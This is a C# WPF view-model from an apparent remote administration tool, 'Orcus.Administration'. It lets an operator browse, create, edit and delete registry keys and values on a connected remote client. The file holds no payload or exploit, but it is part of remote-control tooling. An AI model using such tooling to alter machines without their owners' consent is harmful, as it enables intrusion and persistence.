using System;
using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Registry;
using Orcus.Administration.Core.Utilities;
using Orcus.Administration.FileExplorer.Helpers;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.Registry;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.Registry;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class RegistryViewModel : CommandView
    {
        private RelayCommand _createNewSubKeyCommand;
        private RelayCommand _createRegistryValueCommand;
        private string _currentPath;
        private RelayCommand _editRegistryValueCommand;
        private RelayCommand _openPathCommand;
        private RegistryCommand _registryCommand;
        private ObservableCollection<RegistryValue> _registryValues;
        private RelayCommand _removeRegistryValueCommand;
        private RelayCommand _removeSubKeyCommand;
        private AdvancedRegistrySubKey _selectedRegistrySubKey;

        public override string Name { get; } = (string) Application.Current.Resources["Registry"];
        public override Category Category { get; } = Category.System;
        public RegistryTreeViewModel RegistryTreeViewModel { get; private set; }

        public string CurrentPath
        {
            get { return _currentPath; }
            private set { SetProperty(value, ref _currentPath); }
        }

        public ObservableCollection<RegistryValue> RegistryValues
        {
            get { return _registryValues; }
            set { SetProperty(value, ref _registryValues); }
        }

        public RelayCommand EditRegistryValueCommand
        {
            get
            {
                return _editRegistryValueCommand ?? (_editRegistryValueCommand = new RelayCommand(parameter =>
                {
                    var registryValue = parameter as RegistryValue;
                    if (registryValue == null)
                        return;

                    var editValueViewModel = new EditValueViewModel(registryValue);
                    if (WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, editValueViewModel) == true)
                        _registryCommand.CreateValue(_selectedRegistrySubKey, editValueViewModel.RegistryValue);
                }));
            }
        }

        public RelayCommand CreateRegistryValueCommand
        {
            get
            {
                return _createRegistryValueCommand ?? (_createRegistryValueCommand = new RelayCommand(parameter =>
                {
                    var registryKind = (RegistryValueKind) parameter;
                    var editValueViewModel = new EditValueViewModel(registryKind);
                    
                    if (WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, editValueViewModel) == true)
                        _registryCommand.CreateValue(_selectedRegistrySubKey, editValueViewModel.RegistryValue);
                }));
            }
        }

        public RelayCommand RemoveRegistryValueCommand
        {
            get
            {
                return _removeRegistryValueCommand ?? (_removeRegistryValueCommand = new RelayCommand(parameter =>
                {
                    var registryValue = parameter as RegistryValue;
                    if (registryValue == null)
                        return;
                    if (
                        WindowService.ShowMessageBox(
                            string.Format((string) Application.Current.Resources["SureRemoveRegistryValue"],
                                registryValue.Key), (string) Application.Current.Resources["Warning"],
                            MessageBoxButton.OKCancel, MessageBoxImage.Warning) != MessageBoxResult.OK)
                        return;
                    _registryCommand.DeleteValue(_selectedRegistrySubKey, registryValue);
                }));
            }
        }

        public RelayCommand CreateNewSubKeyCommand
        {
            get
            {
                return _createNewSubKeyCommand ?? (_createNewSubKeyCommand = new RelayCommand(parameter =>
                {
                    var subKey = (SubKeyNodeViewModel) parameter;

                    var createSubKeyViewModel = new CreateSubKeyViewModel(subKey.Value.Path);

                    if (WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, createSubKeyViewModel) != true)
                        return;

                    var path = string.IsNullOrEmpty(subKey.Value.RelativePath)
                        ? createSubKeyViewModel.Name
                        : subKey.Value.RelativePath + "\\" + createSubKeyViewModel.Name;

                    var fullPath = subKey.Value.RegistryHive.ToReadableString() + "\\" + path;

                    EventHandler<RegistryKeyChangedEventArgs> handler = null;
                    handler = (sender, args) =>
                    {
                        if (fullPath != args.Path)
                            return;

                        if (subKey.Entries.IsLoaded)
                        {
                            subKey.Entries.All.Add(new SubKeyNodeViewModel(RegistryTreeViewModel,
                                new AdvancedRegistrySubKey
                                {
                                    IsEmpty = true,
                                    Name = createSubKeyViewModel.Name,
                                    Path = fullPath,
                                    RelativePath = path,
                                    RegistryHive = subKey.Value.RegistryHive
                                }, subKey, _registryCommand));
                        }

                        _registryCommand.SubKeyCreated -= handler;
                    };

                    _registryCommand.SubKeyCreated += handler;
                    _registryCommand.CreateSubKey(subKey.Value.RegistryHive, path);
                }));
            }
        }

        public RelayCommand RemoveSubKeyCommand
        {
            get
            {
                return _removeSubKeyCommand ?? (_removeSubKeyCommand = new RelayCommand(parameter =>
                {
                    var subKey = (SubKeyNodeViewModel) parameter;

                    if (
                        WindowService.ShowMessageBox(
                            string.Format((string) Application.Current.Resources["SureDeleteSubKey"], subKey.Value.Name),
                            (string) Application.Current.Resources["Warning"], MessageBoxButton.OKCancel,
                            MessageBoxImage.Warning, MessageBoxResult.Cancel) !=
                        MessageBoxResult.OK)
                        return;

                    EventHandler<RegistryKeyChangedEventArgs> handler = null;
                    handler = (sender, args) =>
                    {
                        if (args.Path != subKey.Value.Path)
                            return;

                        var parent = subKey.Parent;
                        if (parent != null && parent.Entries.IsLoaded)
                            parent.Entries.All.Remove(subKey);

                        _registryCommand.SubKeyDeleted -= handler;
                    };

                    _registryCommand.SubKeyDeleted += handler;
                    _registryCommand.DeleteSubKey(subKey.Value.RegistryHive, subKey.Value.RelativePath);
                }));
            }
        }

        public RelayCommand OpenPathCommand
        {
            get
            {
                return _openPathCommand ??
                       (_openPathCommand =
                           new RelayCommand(
                               parameter =>
                               {
                                   RegistryTreeViewModel.SelectAsync(new AdvancedRegistrySubKey
                                   {
                                       Path = (string) parameter
                                   }).Forget();
                               }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _registryCommand = clientController.Commander.GetCommand<RegistryCommand>();
            _registryCommand.RegistryValuesReceived += RegistryCommand_RegistryValuesReceived;
            _registryCommand.ValuesChanged += RegistryCommand_ValuesChanged;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Registry.ico", UriKind.Absolute));
        }

        public override void LoadView(bool loadData)
        {
            RegistryTreeViewModel = new RegistryTreeViewModel(_registryCommand);
            RegistryTreeViewModel.Selection.AsRoot().SelectionChanged += OnSelectionChanged;
        }

        private void OnSelectionChanged(object sender, EventArgs eventArgs)
        {
            var root = RegistryTreeViewModel.Selection.AsRoot();
            var currentItem = root.SelectedViewModel;
            currentItem.IsBringIntoView = true;

            if (currentItem.Parent != null)
                currentItem.Parent.Entries.IsExpanded = true;

            _selectedRegistrySubKey = root.SelectedValue;
            RegistryValues = null;
            _registryCommand.GetRegistryValues(_selectedRegistrySubKey.RegistryHive,
                _selectedRegistrySubKey.RelativePath);

            CurrentPath = root.SelectedValue.Path;
        }

        private void RegistryCommand_ValuesChanged(object sender, EventArgs e)
        {
            _registryCommand.GetRegistryValues(_selectedRegistrySubKey.RegistryHive,
                _selectedRegistrySubKey.RelativePath);
        }

        private void RegistryCommand_RegistryValuesReceived(object sender, RegistryValuesReceivedEventArgs e)
        {
            if (_selectedRegistrySubKey == null ||
                !(_selectedRegistrySubKey.RegistryHive == e.RegistryHive &&
                  _selectedRegistrySubKey.RelativePath == e.Path))
                return;

            RegistryValues = new ObservableCollection<RegistryValue>(e.RegistryValues);
        }
    }
}